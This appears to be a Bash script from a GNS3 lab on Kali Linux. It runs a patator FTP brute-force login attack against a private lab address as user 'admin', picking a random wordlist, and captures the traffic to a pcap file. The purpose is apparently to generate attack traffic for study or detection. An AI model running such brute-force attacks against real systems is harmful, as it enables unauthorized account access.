#!/bin/bash

TARGET="192.168.10.3"
INTERFACE="eth0"
USER="admin"
BRUTE_FOLDER="/home/kali/GNS3/BruteForce"
WORDLIST=$(find "$BRUTE_FOLDER" -type f -name "*.txt" | shuf -n 1)
PCAP_FILE="/home/kali/GNS3/pcap/bruteforce_ftp_$(date +%Y%m%d_%H%M%S).pcap"

if [[ ! -f "$WORDLIST" ]]; then
  echo "No password wordlist found in $BRUTE_FOLDER"
  exit 1
fi

echo "Using wordlist: $WORDLIST"
echo "Starting tcpdump to $PCAP_FILE..."
sudo tcpdump -i "$INTERFACE" host "$TARGET" -w "$PCAP_FILE" &
TCPDUMP_PID=$!

patator ftp_login host="$TARGET" user="$USER" password=FILE0 0="$WORDLIST" -t 5

echo "Stopping tcpdump..."
kill "$TCPDUMP_PID"

echo "FTP brute-force simulation complete. PCAP saved to $PCAP_FILE"

